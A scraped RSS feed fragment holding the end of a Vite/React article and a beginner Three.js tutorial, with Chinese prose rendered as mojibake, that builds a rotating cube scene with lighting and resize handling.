<p>ä» <code>npm init vite</code> åˆå§‹åŒ–é¡¹ç›®ï¼Œåˆ°ä½¿ç”¨ <code>useState</code> å’Œ <code>useEffect</code> ç®¡ç†çŠ¶æ€ä¸å‰¯ä½œç”¨ï¼Œå†åˆ°é€šè¿‡ React Router å®ç°å¤šé¡µé¢å¯¼èˆªï¼Œè¿™ä¸€æ•´å¥—æµç¨‹ä½“ç°äº†ç°ä»£å‰ç«¯å·¥ç¨‹åŒ–çš„ç²¾é«“ï¼š<strong>å·¥å…·è‡ªåŠ¨åŒ–ã€ç»“æ„æ¨¡å—åŒ–ã€é€»è¾‘ç»„ä»¶åŒ–</strong>ã€‚Vite æä¾›äº†æé€Ÿå¼€å‘ä½“éªŒï¼ŒReact æä¾›äº†å£°æ˜å¼ UI èŒƒå¼ï¼ŒReact Router è§£å†³äº† SPA è·¯ç”±é—®é¢˜â€”â€”ä¸‰è€…ç»“åˆï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿä»¥æœ€å°çš„è®¤çŸ¥æˆæœ¬æ„å»ºå‡ºé«˜æ€§èƒ½ã€å¯ç»´æŠ¤çš„åº”ç”¨ã€‚æŒæ¡è¿™å¥—å·¥ä½œæµï¼Œä¸ä»…æ˜¯åº”å¯¹æ—¥å¸¸å¼€å‘çš„åˆ©å™¨ï¼Œæ›´æ˜¯ç†è§£ç°ä»£ Web åº”ç”¨æ¶æ„çš„å…³é”®ä¸€æ­¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Three.js å…¥é—¨æ•™ç¨‹ï¼šä»é›¶å¼€å§‹æ„å»ºä½ çš„ç¬¬ä¸€ä¸ª3Dåº”ç”¨]]></title>    <link>https://juejin.cn/post/7589916567875977258</link>    <guid>https://juejin.cn/post/7589916567875977258</guid>    <pubDate>2026-01-01T13:50:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589916567875977258" data-draft-id="7589839433321414719" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Three.js å…¥é—¨æ•™ç¨‹ï¼šä»é›¶å¼€å§‹æ„å»ºä½ çš„ç¬¬ä¸€ä¸ª3Dåº”ç”¨"/> <meta itemprop="keywords" content="d3.js"/> <meta itemprop="datePublished" content="2026-01-01T13:50:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çº¦ç¿°_éº¦å¡å²©"/> <meta itemprop="url" content="https://juejin.cn/user/1250558346006041"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Three.js å…¥é—¨æ•™ç¨‹ï¼šä»é›¶å¼€å§‹æ„å»ºä½ çš„ç¬¬ä¸€ä¸ª3Dåº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1250558346006041/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çº¦ç¿°_éº¦å¡å²©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T13:50:36.000Z" title="Thu Jan 01 2026 13:50:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨Webå¼€å‘é¢†åŸŸï¼Œ3Då›¾å½¢æ¸²æŸ“ä¸€ç›´æ˜¯ä¸€ä¸ªå……æ»¡æŒ‘æˆ˜çš„æŠ€æœ¯é¢†åŸŸã€‚Three.jsä½œä¸ºæœ€å—æ¬¢è¿çš„JavaScript 3Dåº“ï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿè½»æ¾åœ°åœ¨æµè§ˆå™¨ä¸­åˆ›å»ºä»¤äººæƒŠå¹çš„3Dæ•ˆæœå’Œäº¤äº’å¼ä½“éªŒã€‚æœ¬æ•™ç¨‹å°†å¸¦ä½ ä»é›¶å¼€å§‹ï¼Œä½¿ç”¨Three.jsæ„å»ºä½ çš„ç¬¬ä¸€ä¸ª3Dåº”ç”¨ã€‚</p>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯Three.jsï¼Ÿ</h2>
<p>Three.jsæ˜¯ä¸€ä¸ªè½»é‡çº§çš„JavaScript 3Dåº“ï¼Œå®ƒåŸºäºWebGLæŠ€æœ¯æ„å»ºï¼Œä¸ºWebå¼€å‘è€…æä¾›äº†ç®€å•è€Œå¼ºå¤§çš„3Då›¾å½¢æ¸²æŸ“èƒ½åŠ›ã€‚æ— è®ºæ˜¯åˆ›å»ºæ¸¸æˆã€3Dæ•°æ®å¯è§†åŒ–ã€äº¤äº’å¼äº§å“å±•ç¤ºï¼Œè¿˜æ˜¯è‰ºæœ¯åˆ›ä½œï¼ŒThree.jséƒ½èƒ½æ»¡è¶³ä½ çš„éœ€æ±‚ã€‚</p>
<h2 data-id="heading-2">é¡¹ç›®åˆå§‹åŒ–</h2>
<p>é¦–å…ˆï¼Œç¡®ä¿ä½ çš„é¡¹ç›®å·²ç»å®‰è£…äº†Three.jsã€‚åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ESæ¨¡å—çš„æ–¹å¼å¯¼å…¥Three.jsï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"three"</span>;
</code></pre>
<p>è¿™ä¸ªå¯¼å…¥è¯­å¥ä¼šå°†æ•´ä¸ªThree.jsåº“å¯¼å…¥ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨çš„<code>THREE</code>å¯¹è±¡ã€‚</p>
<h2 data-id="heading-3">åˆ›å»º3Dåœºæ™¯çš„æ ¸å¿ƒç»„ä»¶</h2>
<p>åœ¨Three.jsä¸­ï¼Œä»»ä½•3Dåœºæ™¯éƒ½éœ€è¦ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š<strong>åœºæ™¯ï¼ˆSceneï¼‰</strong>ã€<strong>ç›¸æœºï¼ˆCameraï¼‰<strong>å’Œ</strong>æ¸²æŸ“å™¨ï¼ˆRendererï¼‰</strong>ã€‚è®©æˆ‘ä»¬é€ä¸€äº†è§£å®ƒä»¬ã€‚</p>
<h3 data-id="heading-4">1. åˆ›å»ºåœºæ™¯</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
</code></pre>
<p>åœºæ™¯ï¼ˆSceneï¼‰æ˜¯3Dä¸–ç•Œçš„å®¹å™¨ï¼Œæ‰€æœ‰çš„3Då¯¹è±¡ã€å…‰æºã€æè´¨ç­‰éƒ½ä¼šè¢«æ·»åŠ åˆ°è¿™ä¸ªåœºæ™¯ä¸­ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ªè™šæ‹Ÿçš„3Dç©ºé—´ï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä¸­æ”¾ç½®å„ç§3Då…ƒç´ ã€‚</p>
<h3 data-id="heading-5">2. åˆ›å»ºç›¸æœº</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(
  <span class="hljs-number">45</span>, <span class="hljs-comment">// è§†è§’</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-comment">// å®½é«˜æ¯”</span>
  <span class="hljs-number">0.1</span>, <span class="hljs-comment">// è¿‘å¹³é¢</span>
  <span class="hljs-number">1000</span> <span class="hljs-comment">// è¿œå¹³é¢</span>
);
</code></pre>
<p>ç›¸æœºï¼ˆCameraï¼‰å†³å®šäº†æˆ‘ä»¬è§‚å¯Ÿ3Dä¸–ç•Œçš„è§’åº¦ã€‚<code>PerspectiveCamera</code>ï¼ˆé€è§†ç›¸æœºï¼‰æ¨¡æ‹Ÿäº†äººçœ¼çš„è§†è§‰æ•ˆæœï¼š</p>
<ul>
<li><strong>è§†è§’ï¼ˆField of Viewï¼‰</strong>ï¼šè®¾ç½®ä¸º45åº¦ï¼Œè¿™æ˜¯äººçœ¼çš„è‡ªç„¶è§†è§’</li>
<li><strong>å®½é«˜æ¯”ï¼ˆAspect Ratioï¼‰</strong>ï¼šæ ¹æ®çª—å£å°ºå¯¸åŠ¨æ€è®¡ç®—ï¼Œç¡®ä¿3Då†…å®¹ä¸ä¼šå‡ºç°å˜å½¢</li>
<li><strong>è¿‘å¹³é¢ï¼ˆNear Clipping Planeï¼‰</strong>ï¼šè®¾ç½®ä¸º0.1ï¼Œå®šä¹‰äº†ç›¸æœºèƒ½çœ‹åˆ°çš„æœ€è¿‘è·ç¦»</li>
<li><strong>è¿œå¹³é¢ï¼ˆFar Clipping Planeï¼‰</strong>ï¼šè®¾ç½®ä¸º1000ï¼Œå®šä¹‰äº†ç›¸æœºèƒ½çœ‹åˆ°çš„æœ€è¿œè·ç¦»</li>
</ul>
<h3 data-id="heading-6">3. åˆ›å»ºæ¸²æŸ“å™¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);
</code></pre>
<p>æ¸²æŸ“å™¨ï¼ˆRendererï¼‰æ˜¯Three.jsçš„æ ¸å¿ƒç»„ä»¶ï¼Œå®ƒè´Ÿè´£å°†3Dåœºæ™¯æ¸²æŸ“åˆ°2Dç”»å¸ƒä¸Šï¼š</p>
<ul>
<li><strong>WebGLRenderer</strong>ï¼šä½¿ç”¨WebGLæŠ€æœ¯è¿›è¡Œç¡¬ä»¶åŠ é€Ÿæ¸²æŸ“</li>
<li><strong>setSize()</strong>ï¼šè®¾ç½®æ¸²æŸ“å™¨çš„å°ºå¯¸ï¼Œé€šå¸¸ä¸çª—å£å¤§å°ä¿æŒä¸€è‡´</li>
<li><strong>appendChild()</strong>ï¼šå°†æ¸²æŸ“å™¨çš„DOMå…ƒç´ æ·»åŠ åˆ°HTMLé¡µé¢ä¸­</li>
</ul>
<h2 data-id="heading-7">åˆ›å»º3Då¯¹è±¡</h2>
<p>ç°åœ¨è®©æˆ‘ä»¬åœ¨åœºæ™¯ä¸­åˆ›å»ºä¸€ä¸ªç®€å•çš„3Dç«‹æ–¹ä½“ã€‚</p>
<h3 data-id="heading-8">1. åˆ›å»ºå‡ ä½•ä½“</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
</code></pre>
<p>å‡ ä½•ä½“ï¼ˆGeometryï¼‰å®šä¹‰äº†3Då¯¹è±¡çš„å½¢çŠ¶ã€‚è¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª1Ã—1Ã—1çš„ç«‹æ–¹ä½“ã€‚</p>
<h3 data-id="heading-9">2. åˆ›å»ºæè´¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span> });
</code></pre>
<p>æè´¨ï¼ˆMaterialï¼‰å®šä¹‰äº†3Då¯¹è±¡çš„å¤–è§‚ã€‚æˆ‘ä»¬ä½¿ç”¨äº†<code>MeshBasicMaterial</code>ï¼Œè¿™æ˜¯æœ€ç®€å•çš„æè´¨ç±»å‹ï¼Œåªå®šä¹‰é¢œè‰²ã€‚è¿™é‡Œè®¾ç½®äº†ç»¿è‰²ï¼ˆ0x00ff00ï¼‰ã€‚</p>
<h3 data-id="heading-10">3. åˆ›å»ºç½‘æ ¼</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
</code></pre>
<p>ç½‘æ ¼ï¼ˆMeshï¼‰æ˜¯å‡ ä½•ä½“å’Œæè´¨çš„ç»„åˆï¼Œä»£è¡¨ä¸€ä¸ªå®Œæ•´çš„3Då¯¹è±¡ã€‚</p>
<h3 data-id="heading-11">4. æ·»åŠ åˆ°åœºæ™¯</h3>
<pre><code class="hljs language-javascript" lang="javascript">scene.<span class="hljs-title function_">add</span>(cube);
</code></pre>
<p>å°†åˆ›å»ºçš„ç«‹æ–¹ä½“æ·»åŠ åˆ°åœºæ™¯ä¸­ï¼Œè¿™æ ·å®ƒå°±ä¼šåœ¨æ¸²æŸ“æ—¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<h2 data-id="heading-12">ç›¸æœºå®šä½å’Œè§‚å¯Ÿ</h2>
<pre><code class="hljs language-javascript" lang="javascript">camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;
camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
</code></pre>
<p>è¿™ä¸¤è¡Œä»£ç è®¾ç½®ç›¸æœºçš„ä½ç½®å’Œæœå‘ï¼š</p>
<ul>
<li><strong>ç›¸æœºä½ç½®</strong>ï¼šå°†ç›¸æœºæ²¿Zè½´å‘åç§»åŠ¨5ä¸ªå•ä½ï¼Œç¡®ä¿æˆ‘ä»¬èƒ½çœ‹åˆ°ç«‹æ–¹ä½“</li>
<li><strong>ç›¸æœºæœå‘</strong>ï¼šè®©ç›¸æœºæœå‘åœºæ™¯çš„ä¸­å¿ƒç‚¹ï¼ˆ0, 0, 0ï¼‰</li>
</ul>
<h2 data-id="heading-13">åŠ¨ç”»å¾ªç¯</h2>
<p>Three.jsä¸­æœ€æ¿€åŠ¨äººå¿ƒçš„éƒ¨åˆ†å°±æ˜¯åˆ›å»ºåŠ¨ç”»ã€‚é€šè¿‡<code>requestAnimationFrame</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºæµç•…çš„3DåŠ¨ç”»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  
  <span class="hljs-comment">// æ—‹è½¬</span>
  cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> += <span class="hljs-number">0.01</span>;
  cube.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.01</span>;
  
  <span class="hljs-comment">// æ¸²æŸ“</span>
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
}

<span class="hljs-title function_">animate</span>();
</code></pre>
<h3 data-id="heading-14">åŠ¨ç”»åŸç†</h3>
<ol>
<li><strong>requestAnimationFrame</strong>ï¼šè¿™æ˜¯æµè§ˆå™¨æä¾›çš„APIï¼Œå®ƒä¼šå‘Šè¯‰æµè§ˆå™¨æˆ‘ä»¬éœ€è¦æ‰§è¡ŒåŠ¨ç”»ï¼Œè®©æµè§ˆå™¨åœ¨ä¸‹ä¸€æ¬¡é‡ç»˜ä¹‹å‰è°ƒç”¨æˆ‘ä»¬çš„å‡½æ•°</li>
<li><strong>æ—‹è½¬åŠ¨ç”»</strong>ï¼šæ¯å¸§éƒ½å°†ç«‹æ–¹ä½“ç»•Xè½´å’ŒYè½´æ—‹è½¬0.01å¼§åº¦</li>
<li><strong>æ¸²æŸ“</strong>ï¼šè°ƒç”¨æ¸²æŸ“å™¨å°†å½“å‰åœºæ™¯æ¸²æŸ“åˆ°å±å¹•ä¸Š</li>
</ol>
<h2 data-id="heading-15">æ‰©å±•åŠŸèƒ½</h2>
<h3 data-id="heading-16">å“åº”å¼è®¾è®¡</h3>
<p>ä¸ºäº†è®©æˆ‘ä»¬çš„3Dåº”ç”¨é€‚åº”ä¸åŒå±å¹•å°ºå¯¸ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ çª—å£resizeäº‹ä»¶ç›‘å¬ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> {
  camera.<span class="hljs-property">aspect</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
});
</code></pre>
<h3 data-id="heading-17">æ·»åŠ å…‰ç…§</h3>
<p>ä¸ºäº†è®©3Då¯¹è±¡çœ‹èµ·æ¥æ›´åŠ çœŸå®ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ å…‰ç…§ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> light = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">1</span>);
light.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);
scene.<span class="hljs-title function_">add</span>(light);

<span class="hljs-keyword">const</span> ambientLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AmbientLight</span>(<span class="hljs-number">0x404040</span>);
scene.<span class="hljs-title function_">add</span>(ambientLight);
</code></pre>
<h3 data-id="heading-18">åˆ›å»ºå¤šä¸ªå¯¹è±¡</h3>
<p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºæ›´å¤šçš„3Då¯¹è±¡æ¥ä¸°å¯Œåœºæ™¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åˆ›å»ºå¤šä¸ªç«‹æ–¹ä½“</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
  <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({
    <span class="hljs-attr">color</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0xffffff</span>
  });
  <span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
  
  cube.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">20</span>;
  cube.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">20</span>;
  cube.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">20</span>;
  
  scene.<span class="hljs-title function_">add</span>(cube);
}
</code></pre>
<h2 data-id="heading-19">æ€»ç»“</h2>
<p>é€šè¿‡è¿™ä¸ªç®€å•çš„Three.jsåº”ç”¨ï¼Œæˆ‘ä»¬äº†è§£äº†3Då›¾å½¢ç¼–ç¨‹çš„åŸºæœ¬æ¦‚å¿µï¼š</p>
<ol>
<li><strong>åœºæ™¯ç®¡ç†</strong>ï¼šä½¿ç”¨Sceneå®¹å™¨ç®¡ç†æ‰€æœ‰3Då¯¹è±¡</li>
<li><strong>è§†è§’æ§åˆ¶</strong>ï¼šé€šè¿‡Cameraæ§åˆ¶è§‚å¯Ÿ3Dä¸–ç•Œçš„è§’åº¦</li>
<li><strong>æ¸²æŸ“è¾“å‡º</strong>ï¼šä½¿ç”¨Rendererå°†3Dåœºæ™¯æ¸²æŸ“åˆ°2Dç”»å¸ƒ</li>
<li><strong>å‡ ä½•ä½“å’Œæè´¨</strong>ï¼šåˆ›å»ºå’Œé…ç½®3Då¯¹è±¡çš„å¤–è§‚</li>
<li><strong>åŠ¨ç”»å®ç°</strong>ï¼šä½¿ç”¨requestAnimationFrameåˆ›å»ºæµç•…çš„åŠ¨ç”»æ•ˆæœ</li>
</ol>
<p>Three.jsçš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½é›†ï¼ŒåŒ…æ‹¬å„ç§å‡ ä½•ä½“ã€æè´¨ã€å…‰ç…§æ¨¡å‹ã€çº¹ç†ã€é˜´å½±ã€ç²’å­ç³»ç»Ÿç­‰ã€‚éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œä½ å¯ä»¥åˆ›å»ºè¶Šæ¥è¶Šå¤æ‚çš„3Dåº”ç”¨ã€‚</p>
<h2 data-id="heading-20">ä¸‹ä¸€æ­¥å­¦ä¹ å»ºè®®</h2>
<ol>
<li><strong>æ¢ç´¢æ›´å¤šå‡ ä½•ä½“</strong>ï¼šå­¦ä¹ çƒä½“ã€åœ†æŸ±ä½“ã€å¹³é¢ç­‰åŸºæœ¬å‡ ä½•ä½“</li>
<li><strong>æè´¨è¿›é˜¶</strong>ï¼šç ”ç©¶Lambertæè´¨ã€Phongæè´¨ç­‰æ›´çœŸå®çš„å…‰ç…§æ¨¡å‹</li>
<li><strong>çº¹ç†æ˜ å°„</strong>ï¼šå­¦ä¹ å¦‚ä½•ä¸º3Då¯¹è±¡æ·»åŠ çº¹ç†å›¾ç‰‡</li>
<li><strong>äº¤äº’æ§åˆ¶</strong>ï¼šä½¿ç”¨Three.jsçš„æ§åˆ¶å™¨æ·»åŠ é¼ æ ‡äº¤äº’åŠŸèƒ½</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå­¦ä¹ å¦‚ä½•ä¼˜åŒ–3Dåœºæ™¯çš„æ€§èƒ½</li>
</ol>
